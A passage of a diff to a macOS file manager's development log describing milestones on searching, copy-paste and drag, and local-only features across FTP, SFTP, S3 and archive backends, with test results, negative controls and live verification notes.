+underneath it.
+
+**A saved search is the only place where the scope, not the pane, says where a search runs** — it
+carries an absolute path from whenever it was saved and deliberately does not follow the pane. It
+inherited Spotlight by default, and `FileQuery.mdfindArguments` takes `scope.path` and drops the
+backend, so what a saved bucket or archive search actually ran was decided by how deep its scope
+was. Measured, not guessed, by reverting `runSavedSearch` in the built app and clicking the same
+row: a scope at a **backend root** — every archive root, every bucket root, every server home —
+spells `path` as `"/"`, so **"Zip reports", a search saved inside a four-file zip, came back with
+1275 hits** from `/System`, `/Library` and the crash logs, in a tab wearing the name the user gave
+it. One level down (`/2026`, `/docs`) it answers zero. Both are the quiet direction and the first
+is worse: an empty pane at least looks like an answer about nothing. `SearchRoute.forSavedSearch`
+is the fix, `mdfind -onlyin /` reproducing 1275 at a shell is the corroboration, and the restored
+build gives the 4 archive hits back.
+
+**The bigger finding is that this milestone's opening premise is false, and it was false in four
+places.** §M22 opened saying a hit is reached "exactly as a local one is, with no work", because a
+results tab's container is synthetic while every entry carries its real `VFSPath`. True of the
+*paths*; false of the four properties that resolve them, each of which asked `panel.path.backend`
+— which in a results tab says `search:`. So ⌃Q drew nothing on an archive or server hit,
+⌘Y reported **“No items selected”**, ⏎ inside a zip did nothing at all, and F4 said the file could
+not be edited — all four about rows the browse route handles perfectly. Slice 2 met this shape at
+F5 and fixed that one site; Slices 3 and 4 then made remote hits real, which is what made the rest
+reachable. `previewableArchiveMember`, `remoteFileUnderCursor`, `previewsCursorFileOnly` and
+`isWritableArchiveMember` now ask the row.
+
+One more thing the slice made reachable and closed in the core: **a walk's root must be listable.**
+A stored scope can since have been renamed, deleted, or be on a server nobody reconnected to, and
+skipping the root the way an unreadable *subdirectory* is skipped returns zero hits and `complete`
+— indistinguishable from "nothing matched". The root now throws; below it nothing changed.
+
++6 core (2475) and +8 app (531) tests, both linters and all three scripts clean; one new string in
+all 14 languages. Six negative controls, each firing on exactly the tests naming it with every
+narrowness control still green — and a seventh run in the built app, which is the only instrument
+that could see the saved-search bug at all.
+
+**The FTP/FTPS verification pass landed 2026-08-16**, and it is the one backend of the four the
+milestone was asked for that no slice had ever exercised live. FTP takes the generic walk through
+`isRemoteConnection`, so it needed no code of its own and nothing could be said about it beyond
+"it compiles". The instrument is the one this milestone named at open: `pyftpdlib` on
+`127.0.0.1:2121` plain and `:2122` explicit FTPS with a self-signed certificate, logging every
+command it is asked to run, plus a throwaway SwiftPM harness compiling the app's **real**
+`FTPCurlTransport` against the real core so every byte came off a socket through real `curl`.
+
+**Nothing in the FTP half was wrong.** Over a 12-directory tree four levels deep: 7 hits at five
+depths, and the server's own log shows the LISTs arriving root → all four depth-1 → all four
+depth-2 → depth-3 → depth-4, which is the breadth-first claim measured at the wire rather than
+argued. Scope narrowing (4 hits from `/docs`), a directory named `odd 'name` walked and its hit
+returned, kind decided from the name, a size filter excluding folders, `contentContains` and
+`tags` **refused** rather than skipped, `budgetExceeded` / `truncated` / `stopped` each reported
+with the hits already found, and a scope that is not there throwing rather than answering "complete,
+nothing found". FTPS behaved identically once its key was pinned.
+
+**What the pass found is bigger than FTP, and it is in `Foundation`.** Every listing was paying a
+flat ≈71 ms in **`Process.waitUntilExit()`, which is a poll and not a wait** — `/usr/bin/true` costs
+the same as a full FTP listing, and a child dead for 300 ms still costs 71.3 ms (8 runs, 70.1–72.5;
+the tightness is the tell). On loopback that was **84 %** of the per-listing cost. It hid for the
+life of the app because its *relative* size is inversely proportional to how fast the child is: on
+`git status` it is a quarter and reads as git being slow, and only something spending one invocation
+**per directory** makes it the whole cost. The fix is one primitive in `ProcessWaiting` — the funnel
+whose own doc comment already argued "one home rather than three copies" — applied to all **14**
+spawn sites, since a half-applied rule is this project's most repeated failure. The whole-tree FTP
+search went **1.04 s → 0.09 s** with byte-identical hits, and the same 0.09 s was then measured in
+the built app against the server's log.
+
+Two things worth keeping beyond the fix. It is **not** what "one `curl` per directory" costs, which
+is the natural first reading: the identical argv from Python's `subprocess` is 6.7 ms against
+Swift's `Process` at 68 ms, and that control is what isolates the wait from the spawn, the flags and
+the network. And it mostly retires the optimisation it makes look attractive — `curl` does reuse one
+connection across many `ftp://` URLs (11 LISTs on 1 connect, the FTP twin of Slice 4's `sftp -b`
+note), but that is **15×** against the shipped path and only **1.4×** against the fixed one.
+
++4 app tests (2475 core / 535 app green, both linters and all three scripts clean). The timing
+property is pinned without a stopwatch reading anyone has to trust, because what it asserts is the
+absence of a *timer*: reaping a process dead for 300 ms, bounded well under the poll interval, which
+no faster machine can drift past. The negative control fails that one test at 63 ms and leaves its
+three narrowness controls green.
+
+**Verified live in the built app**, with the new symbols confirmed present in `Dirnex.debug.dylib`
+first: plain FTP 7 hits and FTPS 7 hits (12 breadth-first LISTs each, 0.091 s and 0.154 s, the
+difference being TLS per connection), the Find Files dialog drawing **Name / Kind / Size / Modified**
+on the FTP scope and **Content contains / Tags** as well on a local one *in the same session*, and
+the trust dialog's fingerprint matching `openssl`'s byte for byte. The three other routes the
+14-site change touched were checked in the same run and all behave: Spotlight (⌥F7 locally),
+the git badge (`M` on a modified folder, plus the branch chip), and `bsdtar` archive browsing and
+searching (3 hits at three depths inside a zip).
+
+---
+
+### M23 — Copy, paste and drag, wherever the file is (M)
+
+Opened 2026-08-26 and closed the same day; all five slices, the live verification pass and the
+[LOCATION-SUPPORT.md](LOCATION-SUPPORT.md) cells landed 2026-08-26. Scope set by the user at open:
+**exactly what a local file has** — ⌘C/⌘V and drag in every direction inside Dirnex, drag *out* into
+Finder, Teams and anything else that takes a file, and drag *in* from them onto a server.
+
+⌘C and drag-and-drop had been local-only since M1/M2, for one reason: the pasteboard carries
+`file://` URLs, and a row on a server, in a bucket or inside an archive has none. So
+`PanelViewController+Clipboard.copy(_:)` refused ⌘C on a remote pane outright,
+`pasteboardWriterForRow` returned `nil` for every non-local row, and `dropPlan` required a `.local`
+destination. **The transfer was never what was missing** — `CompositeBackend` routes per path,
+`RelayCopy` already stages bytes between two accounts that have never heard of each other, and
+F5/F6 reached all of it. What was missing was the *carrier*. Two gestures a Mac user reaches for
+without thinking, both silently dead: the top parity gap in the support table, and the one this
+milestone closed.
+
+#### What the pasteboard actually carries — probed before any Swift
+
+A private type (`com.dirnex.locations`) beside the file URL, and four measurements decided the
+shape:
+
+- **One `NSPasteboardItem` carries both**, and macOS still auto-promotes the URL into
+  `NSFilenamesPboardType` and friends — so a **local** row is byte-identical to what shipped and
+  gains the private type for free. A **mixed** selection hands Finder exactly the local subset while
+  Dirnex gets every row, in order.
+- **A multi-row drag is N items, and a board-level `data(forType:)` returns only the *first*.** The
+  trap: a reader written the obvious way drops every row but one, silently, and a two-row drag is
+  the smallest case that shows it. Hence **one item per row on every write, and every read iterates
+  `pasteboardItems`** — which also makes ⌘C and a drag the same shape, rather than two writers
+  needing two readers.
+- **A private-only board answers `canReadObject(forClasses: [NSURL.self])` → `false`**, so
+  `clipboardHasFiles()` had to *learn* the new type rather than be replaced by it, or Paste greys
+  out for exactly the case the milestone exists to serve.
+- **An `NSPasteboardItem` raises if written twice** (`-[NSPasteboard writeObjects:]` throws, probed
+  fatally). Items are built fresh per write — which the multi-row ⌘C path was violating by clearing
+  and rewriting the board in `willBeginAt`.
+
+#### The payload is a snapshot, and that was not a compromise
+
+`PasteboardPayload` carries the path **and** the few fields `CopyEngine` reads off a source entry
+(`kind`, `byteSize`, `name`, `symlinkDestination`), so a paste of 20 objects costs **no** round
+trips. The alternative — carry paths, re-`stat` on paste — is 0.6 s per item on S3, a 12-second
+stall before the job even appears. Staleness is the obvious objection and it was answered by what
+already shipped: **F5 hands the queue entries straight out of the pane's listing**, which are
+exactly as old. The engine re-reads what it must (it copies metadata by *path*) and reports a
+vanished source per item.
+
+One thing the payload deliberately does **not** do: the rebuilt entry's dates, permissions and inode
+are neutral rather than invented. `CopyEngine` reads none of them, and a caller that needs a real
+stat — Get Info, an attribute edit — must go and take one. The payload is a transfer's source, not a
+listing's row.
+
+#### Two latent bugs the milestone made reachable
+
+Both were found by reading, before the slice that would have exposed them, and both landed with it:
+
+- **A drop onto a remote pane would have defaulted to *move*, deleting the local original.**
+  `resolvedKind` follows Finder — move within a volume, copy across — and asked
+  `volumeIdentifier(for:)`, which `CompositeBackend` answers `nil` for every non-local path. `nil`
+  read as *one indistinguishable volume*, so `sameVolume` returned `true` and the default was move.
+  Harmless while every drop destination was local; the expensive direction the moment one was not.
+  **A backend crossing is never the same volume.**
+- **The recursion guards compared paths as strings.** Both `pasteRecurses` and `dropPlan` tested
+  `destination.path.hasPrefix(source.path + "/")` with no backend in it, so a local `/tmp` read as an
+  ancestor of `sftp:/tmp/x` and a legitimate transfer was silently refused.
+  `VFSPath.isSelfOrDescendant(of:)` had asked the question correctly since M1 and is what both
+  should have used.
+
+Both moved into `TransferAdmission` — pure, tested, in the core — because one of them decides whether
+the user's original file is deleted.
+
+#### Slice 1 — `PasteboardPayload` and `TransferAdmission`
+
+Core-only and additive; the app was untouched and needed no rebuild. The per-item snapshot, its wire
+format, the two ways a read is allowed to fail, and the two admission rules above. +20 tests, 2723
+green, both linters clean.
+
+The negative control is the reason to believe them: reverting both rules to the spellings the app
+shipped failed **4 of 12** `TransferAdmission` tests — including *"a drag onto another backend
+copies — the case that would have deleted the original"* — while every narrowness control stayed
+green (a same-prefix neighbour still does not recurse, two paths on one real volume still share it,
+the modifier cases untouched).
+
+#### Slice 2 — ⌘C and ⌘V across every backend
+
+`PanelPasteboard` became the one bridge this slice and Slice 3's drag both read, so the two gestures
+cannot put different things on the board; `clipboardTargets` decided what may go on it **per row** (a
+results tab holds local, remote and archive rows at once); `pasteDestination`/`canReceiveFiles`
+decided what may land. +19 tests (2725 core, 703 app), both linters clean.
+
+`VFSBackendID.receivesFiles` is the new core predicate, and the **S3 account pane** is why it is not
+just `.write`: F7 there creates a *bucket*, so every capability-shaped gate says yes while a pasted
+file has nowhere to go — without it Paste lights up over a list of buckets and the job fails inside
+the queue rather than the menu item simply being gray.
+
+Four negative controls, run together: reverting ⌘C's remote refusal, the `receivesFiles` gate,
+payload-before-URLs, and URL-only enablement failed **6 assertions across 4 tests** and left the
+other 15 green. The sharpest is *"our own board resolves through the payload"* — reading the URLs off
+our own board is a **different answer**, not a poorer one, because a mixed selection's URL list
+silently omits every remote row, so copying three files and pasting two would report success.
+
+**Verified live**, in the running app via `run operation`: a real ⌘C on a local row put
+`com.dirnex.locations` **and** `public.file-url` on the real general pasteboard, with macOS still
+promoting to `NSFilenamesPboardType` and `Apple URL pasteboard type` — so Finder and Teams still see
+an ordinary file, the non-regression that mattered. ⌘C then ⌘V in the same folder produced
+`alpha copy.txt` with the right bytes. What was *not* verified live is a ⌘C on an actual connected
+server: a remote tab cannot be restored at launch (session restore is `.local`-only) and connecting
+needs the Connect sheet, so that half rests on the headless suites plus the pasteboard probe.
+
+#### Slice 3 — drag in every direction inside Dirnex, and drops from other apps onto a server
+
+The drag source writes through the same `PanelPasteboard` items ⌘C does, the drop reads through the
+same `sources`, and both latent bugs went with it. +13 tests (2725 core, 719 app), both linters
+clean.
+
+**The destination is validated instead of the base**, which is more than a widening: they are the
+same in a flat listing and differ in a **tree**, where a folder row can belong to another backend
+entirely — a bucket's contents drawn under an S3 *account* root. The old code checked
+`writeDirectory` and then dropped into whatever row was under the cursor.
+
+The **default-move** control is the one worth re-running before touching this code. Reverted
+*alone* — destination gate left fixed, so nothing masked it — an unmodified drag from this Mac onto
+a bucket came back `plan.kind → .move`, which is the local original deleted. One test failed and the
+other twelve stayed green. Run *together* with the other two controls it is **hidden**: the
+destination gate refuses the drop first, so the assertion fails on `nil` and never reaches the kind.
+A combined control run would have read as "three bugs caught" while saying nothing about the
+expensive one. This is where the milestone's habit of running controls **one at a time** came from.
+
+**Verified live** for what a headless test cannot reach: a two-row selection put **two** items on
+the real general pasteboard, each carrying the payload *and* its file URL, with `readObjects` still
+returning both URLs — the multi-row shape a drag produces, and the proof the widening path does not
+re-use items. A real drag *session* cannot be synthesized, so what is pinned instead is the
+registration: `registeredDraggedTypes` carries both carriers, without which every rule above is
+unreachable and the pane refuses drags in silence.
+
+#### Slice 4 — a row whose bytes are on a server drags out into Finder
+
+`RemoteFilePromiseProvider` is an `NSFilePromiseProvider` that **also carries the payload**, so
+`PanelPasteboard.dragWriters` decides per row which writer a row gets and a mixed selection stays one
+drag: Finder is handed the local subset plus a promise for the rest, while Dirnex's own drop still
+reads the same snapshot for every row. +13 tests (2725 core, 732 app), both linters clean.
+
+**It runs outside the queue bar, which is the whole difficulty**, and the answer is that the
+completion handler is the report. Fulfilment goes through the same `fetchRemoteFile` funnel ⏎ and F4
+use — so a file already fetched for a preview drags out with no transfer at all, and the deferred
+sheet supplies the bar and the Stop a queue row would have — and the funnel gained one hook,
+`onEnded`, called on **every** terminal path. Two of those paths deliberately reported to nobody and
+were right to: `RemoteFetchPrompt` swallows a cancellation (the user's own answer, already on
+screen), and the funnel returns having started nothing when the pane has no host. Both are correct
+for every gesture except one holding somebody else's callback open.
+
+**The size question was skipped, deliberately.** A drag onto the desktop is the same act as F5, which
+asks nothing whatever the file weighs — and the confirmation would arrive *after* the drop, in front
+of a receiving app already sitting on a spinner it cannot dismiss.
+
+One test was written, measured and **deleted**: driving the failure *alert* needs a live pane in a
+window, and that one test took the app suite from 9/9 green to 7/8, every failure landing in
+`PanelPassiveRefreshTests`. Bisected with `-skip-testing` against a 3/3 baseline of the unchanged
+tree, then re-measured 6/6 green with it gone. The claim it made is kept without a window — the
+handler is answered with an error and the destination left empty (NOTES.md ▸ AppKit).
+
+Six negative controls, run one at a time: no row promised failed 4 tests; the promise not carrying
+the payload failed 3, one of them reading `["x.txt", "y.txt"]` for a three-row drag — a remote row
+silently dropped, the exact failure the payload exists to prevent; the funnel's early return
+reporting to nobody failed the "always answers" test; answering success without placing the bytes
+failed on the *file*; and removing `onCancel` left a stopped drag unanswered. The last two are the
+sharpest, because both leave the receiving app with nothing and neither is visible in Dirnex at all.
+
+**Verified live**: the new class and — the half worth checking rather than assuming — the
+Objective-C selector `filePromiseProvider:writePromiseToURL:completionHandler:` were both confirmed
+present in the built `Dirnex.debug.dylib`, which is what says the delegate method AppKit dispatches
+by selector was actually emitted rather than merely compiled (NOTES.md ▸ AppKit).
+
+#### Slice 5 — archive members, and the split that made them possible
+
+An archive member travels on ⌘C/⌘V and on a drag inside Dirnex, extracting through the funnel F5
+copy-out already used. +3 core tests (2728) and +11 app ones (743), both linters clean.
+
+**The extraction was welded to F5 and had to be split before anything could share it.**
+`beginArchiveExtraction` reads *this* pane's selection and the *counterpart* pane's path, neither of
+which a paste has — so a paste written against it would have grown a second spelling of the
+extraction, this project's most repeated bug. `extractArchiveSources` is that step alone,
+`ArchiveTransferSources` is the per-**row** split that decides who needs it (a results tab holds
+archive, local and remote rows at once, so asking the *pane* answers for none of them), and
+`resolveTransferSources` is the one funnel ⌘V and drop now both read. It is the same split
+`editRoute(for:)` records making for F4 and ⇧F4.
+
+The rule that had to reach the core is that an archive member **can only ever be copied**: the
+container is read-only, so a move would have nothing to remove afterwards, which is why F6 out of an
+archive does not exist. `TransferAdmission.allowsMove` rides in through the *offer* rather than as a
+branch of its own, so a ⌘-forced drag falls back to a copy for free — "a modifier the source does
+not offer is ignored" was already that function's documented behaviour. One member answers for the
+whole drop, because a drag is one gesture with one kind and copying everything is the direction that
+cannot delete anything; a *paste* filters per row instead, since its kind comes from the key and
+dropping what it cannot apply to is what the same-folder rule already did.
+
+**Five negative controls, one at a time.** Putting the archive filter back on the board failed 4
+tests; neutering the split so members reach the queue failed the two end-to-end ones — and failed
+them by reporting a source path of `/one.txt`, a file on this Mac that does not exist, which is the
+symptom exactly; making `allowsMove` answer `true` failed 3 core tests; keeping only the first
+archive's members failed the two-archive grouping. **The fifth is the one worth carrying**: reverting
+the *drop's* move rule alone failed **nothing**, because `resolvedKind` read `NSEvent.modifierFlags`
+inside itself and every unmodified archive drop is already a backend crossing. `dropPlan` now takes
+its modifiers as a defaulted parameter, and with that seam the same revert fails on the badge —
+`plan.kind → .move` — with the narrowness control (⌘ over a local row still moves) green throughout.
+The general rule went to NOTES.md ▸ Testing: *a rule whose input is read by the rule is a rule with
+one test case*, and its tell is a control that passes.
+
+**Verified live**, in the running app driven from a shell. ⌘C on a local row still put both carriers
+on the real general pasteboard and still promoted to `NSFilenamesPboardType`, and ⌘C → ⌘V still
+copied — the non-regression that mattered, since the whole paste path had moved onto a new funnel.
+Then the archive half, which needed no UI at all: writing the byte-identical payload onto the general
+board from a 10-line Swift script and running `edit.paste` extracted `one.txt` out of a real zip into
+a real folder with the right bytes, left `two.txt` in the archive, and left a temp extraction holding
+**one** file — the member filter, the passphrase check, `bsdtar` and the queue all the shipped ones.
+The pasteboard being the seam is what made it reachable: a tab cannot be restored into an archive
+(session restore is `.local`-only) and nothing scriptable enters one, so driving the *reader* from
+outside was the only way in. That instrument is NOTES.md ▸ Live verification.
+
+#### What the risk row asked, and how it held
+
+§6's row said the private type must not become a *second* definition of what a transfer is. It held,
+and the pressure was real in both directions. The destination gate widened once, to `receivesFiles`,
+and it widened **for F5 as well** rather than beside it. Three admission rules moved *out* of the
+gestures into the tested `TransferAdmission` rather than being restated — recursion, volumes, and
+Slice 5's copy-only — each because it already had two hand-written spellings or was about to. And
+Slice 5 pulled the extraction out of F5 instead of teaching ⌘V a second way out of an archive. The
+one refusal the paste path owns that F5 does not is dropping an archive member from a **move**, and
+it is the same rule `moveToOtherPane` enforces by returning — stated once, in the core, read by both.
+
+#### Left deliberately undone
+
+- **Dragging a *folder* out of a server as a promise.** A promise is one file; a recursive fetch
+  behind a Finder drop has no progress surface and no way to stop it. Such a folder still drags
+  inside Dirnex on its payload alone.
+- **Dragging an archive *member* out to another app** — the same reason one layer along, taken by
+  the user 2026-08-26 with F5 copy-out as the route. A promise is fulfilled behind somebody else's
+  drop, where an encrypted archive would have to raise a passphrase sheet with nothing on screen to
+  answer it on; and `extractArchiveSources` reports a failure with an alert rather than through a
+  completion handler, so it would need Slice 4's always-answers contract first.
+- **`⌥⌘V` move-paste into an archive**, which stays gated where it was.
+- **A *drop* into a browsed archive**, where ⌘V adds by repacking and a drag does not.
+- **The pasteboard as an automation surface** — nothing here is scriptable that F5 was not.
+
+**Left for a human**, since a drag *session* cannot be synthesized: an actual drag between two panes,
+a Finder drag onto a connected server, and a drag from a connected server into Finder. The AppKit
+plumbing between the registration and the promise is the one link no test in this milestone reaches.
+
+---
+
+### M24 — Every local-only feature, on a file that is not local (M)
+
+Opened 2026-08-27 and closed 2026-08-28: slices 1–6 landed 08-27 and slice 7 on 08-28, each with
+its own progress note below. The premise is left standing as it read at open — the seven one-line
+refusals it names are gone. Four of those files now carry a doc comment explaining the removal
+instead, and where a `backend == .local` survives in them it asks a different question: which rows
+are *already* files on this disk for a hand-off that cannot wait for a download
+(`handoffTargets`), and which directory a user script can be given as its working directory
+(`localPanelDirectory`).
+
+**Seven features refuse anything that is not on this disk, and each refuses it in one line.**
+`PanelViewController+OpenWith.swift:25` filters the selection to `backend == .local`;
+`+Compare.swift:86` requires it of both sides; `+Checksum.swift:60`, `+UserScript.swift:25`,
+`+ArchivePack.swift:28`, `+Attributes.swift:146` and `+Sync.swift:68` each say the same thing about
+their own gesture. Fifty-five sites in the app read that comparison and most of them are right — Git
+status, Finder tags, vaults, the terminal drawer and the cloud-download prompt are all genuinely
+about *this disk*. These seven are not: nothing about them needs the file to be local, only to be
+**a file**.
+
+The bytes are already reachable, which is what makes this a milestone rather than a rewrite.
+`fetchRemoteFile(_:for:)` has pulled a remote row down for ⏎, F4 and every preview since M21 Slice
+10, under a size policy that decides whether to ask first (`RemoteFetchPolicy`, four purposes and a
+table of thresholds); `ArchiveExtractor` has placed a member since M4, and M19's member filter made
+that 0.001 s for one member of a 600 MB encrypted archive. What is missing is not a download. It is
+a download of **a marked set**, with a determinate bar and a Stop — which is the operation queue's
+job and not a cache's.
+
+#### Three things to settle before any Swift
+
+- **A gesture over N remote files has to say what it will cost before it starts.**
+  `RemoteFetchPolicy` answers per file, for the one file under a cursor, because that is the only
+  shape that existed. ⌥F3 is two files; a checksum run and ⌥F5 are a marked set; a user script is
+  whatever the user marked. So the plan itself is the deliverable — which of the set is already
+  cached, what the rest weighs, and how many billed requests it is — and the confirmation names that
+  total rather than asking once per file.
+- **The engine must never materialize; the gesture must.** `ByteComparator` refuses an evicted cloud
+  placeholder rather than reading through it, and that rule arrives here one protocol out: the
+  compare was asked for, so the *gesture* fetches and reports, and the comparator still only ever
+  sees files that are already here. Anything else puts a silent multi-gigabyte download behind a
+  keystroke — which is the failure `SF_DATALESS` exists to prevent, wearing a network instead of a
+  file provider.
+- **A `.zip` on a server is the whole file.** `ArchiveBackend.init(archiveOnDiskPath:)` needs a real
+  path, so browsing one is fetch-all-then-mount and writing into one is repack-then-upload. Both are
+  affordable and neither is free, and the difference from ⏎ on a small text file is exactly that the
+  user should be told before it starts.
+
+#### Slices
+
+Core first, app untouched until (2), as usual. Each lands runnable.
+
+1. **`MaterializationPlan` in `DirnexCore`** — given a set of `FileEntry` and what the cache already
+   holds, what must be fetched, its total bytes and its request count, and whether that total is
+   over the threshold a given purpose confirms at. `RemoteFetchPurpose` grows the cases these
+   gestures need, so each one's threshold is a line in the existing table rather than a constant at
+   a call site. Pure, tested, additive; no app rebuild.
+   **Landed 2026-08-27**, and three things came out of building it that the slice did not predict.
+   `MaterializationSource` has **five** cases rather than two, because the reasons a row is not yet a
+   readable path cost different amounts and are paid by different people — a remote transfer is ours
+   and S3 bills it, an evicted `SF_DATALESS` placeholder is a wait the file provider owns, and an
+   archive member is neither. The placeholder case is the one that had to be there: its name, size
+   and dates are all real, so nothing but that flag separates it from a file that is genuinely here,
+   and it is exactly the row a plan built on `backend == .local` would have called present. Second,
+   the decision needed a **second rule, not a second table**: `unaskedRequestLimit` (20) is derived
+   from the measured 0.512–0.519 s to first byte for a *small* S3 object, because 10 000 objects of
+   500 bytes is 5 MB — under every row of the size table — and about **83 minutes**, which a policy
+   expressed in bytes is structurally blind to. Third, all six new purposes sit on the existing
+   open/edit row deliberately: they are the same commitment ⏎ carries, and six constants a few
+   megabytes apart would each mean *approximately* 64 MiB and drift on the first visit anybody paid
+   to one of them. The cases exist anyway, because `threshold(for:previewLimit:)` switches
+   exhaustively — which is what stops the next gesture reaching a number by inheriting one.
+   Both directions are controlled: removing the request rule fails only the four tests about it and
+   leaves the "few requests still start" control green, and over-correcting to always-confirm fails
+   exactly the five that say a local, cached or small set must never ask.
+2. **Bulk materialize as a queue job.** An N-file fetch is a `FileOperation`, which buys the
+   determinate bar, Stop, per-item failure reporting and the pause/resume the queue already has —
+   and stops a second copy of the transfer loop existing. `RemoteFileCache` stays the *store* and
+   gains no second way to be filled.
+   **Landed 2026-08-27.** `FileOperation.Kind.materialize` joins `.checksum`, `.attributes` and
+   `.pack` as a kind that produces **no `outcomes`**, which is how "nothing here is undoable" is a
+   property rather than a rule — `UndoJournal` has nothing to build a record from, and reversing a
+   download into a temp directory is not a thing to offer. That is also why it is not expressed as a
+   `.copy` into that root, which the journal would dutifully record as a transfer; it needs no
+   payload either, since `destinationDirectory` already means "where this job puts things" and
+   `sources` is which rows.
+   The loop **keeps going past a failure** and names the row, because that is right for a checksum
+   over forty objects and wrong for ⌥F3 — so the decision belongs to the gesture reading
+   `report.failures`, not to the runner. Two things came out of writing it. `MaterializeRunner
+   .materialize` is now the **one definition of "fetch this row"**, called by the queued loop *and*
+   by `RemoteFileCache.fetch`, so the directory-per-file layout (two objects called `report.pdf` from
+   different prefixes) and the leaves-nothing-behind rule have one home rather than two. And the
+   cache gained one private `record` that `fetch`, `rebaseline` and the new `adopt` all go through,
+   which is what makes "no second way to be filled" a property of the type instead of a rule three
+   call sites keep — the runner produces `MaterializedFile` values and the window adopts them,
+   because `DirnexCore` cannot see a `@MainActor` window-scoped cache at all.
+   Controlled in four directions: one shared directory instead of one per file, a failed transfer
+   keeping its partial, the loop stopping at the first failure, and the queue never dispatching the
+   kind — each fails only the tests that name it.
+3. **Open With… and the Share sheet.** The cheapest of the seven: one file, one URL, and ⏎ already
+   fetches exactly that. The only new question is what a *marked set* of remote rows means for Open
+   With, which is the plan from (1) with a different verb after it.
+   **Landed 2026-08-27**, and the two verbs turned out not to be one gesture with one shape. **Open
+   With pops its menu before anything is downloaded**: a row that is not on this disk is typed by
+   its *name* rather than by a file, which is what LaunchServices types an ordinary file by anyway,
+   so the app list costs nothing and a user who presses Escape has paid nothing — the transfer
+   starts when they pick an application. **Share cannot do that**, because `NSSharingServicePicker`
+   derives its services, their icons and their order from the *items*; there is no list to show
+   before the files exist, so it fetches and then presents. Typing by name is deliberately *not* a
+   fallback: it applies to a non-local row whether or not its bytes happen to be cached, so the menu
+   cannot change depending on what some earlier preview downloaded, and a local row goes on reading
+   the real file — which is what preserves the existing rule that a file deleted between the listing
+   and the right-click offers nothing.
+   **Services is the one that stays local, and it is now a limit rather than a gap.** AppKit fills
+   the pasteboard **synchronously**, inside `writeSelection(to:types:)` as the menu opens, and there
+   is nowhere in that call to put a download — so `canSendToServices` is a second, narrower gate,
+   because asking the wider one would advertise the pane for a selection `writeSelection` then
+   declines to write, leaving Services items that do nothing.
+   Three things fell out of building the funnel (`PanelViewController+Materialize`), which Slices
+   4–6 inherit. A **cloud placeholder is handed over as its own path** and neither confirmed nor
+   fetched: those bytes are the file provider's when the receiving application reads them, exactly
+   as Finder does it — hence `MaterializationPlan.excluding(_:)`, since counting them would put a
+   *"download this from the server"* dialog in front of a file already on this disk. A **folder that
+   is not here is not a hand-off target** at all (`pendingDirectories`, the same rows that make the
+   totals a floor, read from the other side): it stands for an unknown number of objects in an
+   unknown number of requests, and copying a tree out is F5's. And a **short set is a failure**
+   rather than a smaller success — an application given three of the five files somebody marked has
+   been told something untrue — with the server's own reason used for the wording where there is
+   one, which is all `report.failures` is read for: what decides is whether every row *resolved*,
+   since a row that failed while an earlier copy of it is still current costs the user nothing.
+   The queue side needed one thing the other kinds did not: `MaterializeDeliveries`, because
+   `FileOperationQueue.enqueue` is an actor method and the job id the two halves share exists only
+   *after* the job has been accepted and could already have run — so the report and the gesture
+   waiting for it pair in whichever order they arrive. A `.materialize` job is also the one kind
+   that does **not** re-list the panes when it finishes: its destination is a temp root, so a
+   refresh would spend a request per remote pane to redraw rows that cannot have moved.
+   Controlled in seven directions, each failing only the tests that name it: refusing no folder,
+   weighing placeholders, dropping the report's error, handing a short set over anyway, typing a
+   non-local row as untypeable, losing a report that arrives before its gesture, and letting
+   Services ask the wider question.
+   **Verified live against a real `sshd`**, and the gesture that makes the whole chain drivable
+   headlessly is **Share** — it fetches *before* it presents, so `run operation "file.share"` runs
+   the plan, the decision, the queued job, the adoption and the delivery with no UI to click. Two
+   marked SFTP rows produced **two** `Accepted publickey` sessions in the server's own log and two
+   copies under `DirnexRemote`, each in its own directory under its real name with the right bytes.
+   The measurement that separates a cache hit from a gesture that did nothing is the sharp one:
+   deleting **one** of the two copies and repeating the gesture cost exactly **one** session and
+   brought back exactly that file, leaving the other untouched — "nothing changed" would have been
+   true of a dead gesture too. And `run operation "file.openWith"` over the same rows opened its
+   menu (the verb does not return: the menu runs a nested event loop) having moved **zero** bytes,
+   which is the asymmetry the slice was designed around, measured rather than argued.
+   Two things about the instrument are worth keeping. The pane's own **background remote poll**
+   makes a session *count* useless as evidence — it drifted by four over ten idle seconds — so the
+   measurement has to be the delta across the gesture, or better, whether any **bytes** landed,
+   which nothing but a fetch produces. And the cursor of a restored tab lands on the first row,
+   which sorting puts on the *folder* — so the first run measured the refusal rather than the
+   transfer, and the marked set had to be seeded (`markedPaths`) to reach the claim.
+4. **Compare By Contents and checksums.** ⌥F3 fetches both sides and hands `ByteComparator` two
+   local files; a checksum run fetches the marked set and hands `ChecksumEngine` real paths.
+   `ChecksumScope` and the manifest's *stored* names must stay the remote names, or a manifest
+   written beside a bucket's objects names temp directories.
+   **Landed 2026-08-27.** The name-versus-bytes split turned out to be **one line**, because
+   `ChecksumWalkedFile` had carried the two apart since M14 — a manifest-relative *name* and the
+   *entry* whose bytes are read — and only the byte-reading site had ever conflated them. So
+   ``MaterializedPaths`` is consulted in `ChecksumRunContext.digest` and nowhere else: the engine is
+   handed a temp copy while the progress label, the failure path and the manifest's own spelling go
+   on naming the object on the server. A row with no stand-in is
+   ``ChecksumEntryStatus/notDownloaded`` — the answer an evicted cloud placeholder already gave,
+   which is the same fact about a different provider — and it is *reported* rather than thrown, so it
+   cannot be `try?`-ed out of a manifest that would then verify clean while covering less than it
+   claims. A **local path stands for itself**, placeholder included, which is what keeps every
+   ordinary run reaching the identical code with an empty map.
+   **The manifest is written beside the objects it describes, so a bucket's checksum is an upload.**
+   That is forced rather than chosen: every format spells its names relative to the checksum file's
+   own location, so there is no third option where the names still resolve. It needed no new policy —
+   `capabilities(for:)` asked of the **manifest's own directory** already answers per backend, so a
+   writable bucket says yes, a read-only one says no, and a browsed archive refuses itself because
+   `ArchiveBackend` advertises `.read` alone. And there is deliberately **no pre-flight guard on the
+   manifest's backend**: the sentence a user reads should be the one the thing that declined actually
+   said, which is what made `ChecksumRunContext.recordFailure` stop normalizing a `VFSError` through
+   an errno — that had been flattening every backend's own refusal to `.io`, a code nobody can look
+   up standing in for "the bucket is read-only".
+   **Verifying is two-phase, because nothing can know what to fetch until the manifest has been
+   read** — and that is what forced the walk out into ``ChecksumVerifyScope``, shared by the gesture
+   that weighs the set and the run that hashes it. Two spellings of *which files does this manifest
+   claim* would fail in the quiet direction: every file the gesture failed to predict comes back "not
+   downloaded" while sitting right in front of the user. The walk between the phases costs listings
+   and no transfers, so by the time anything is downloaded the total is exact rather than a floor. A
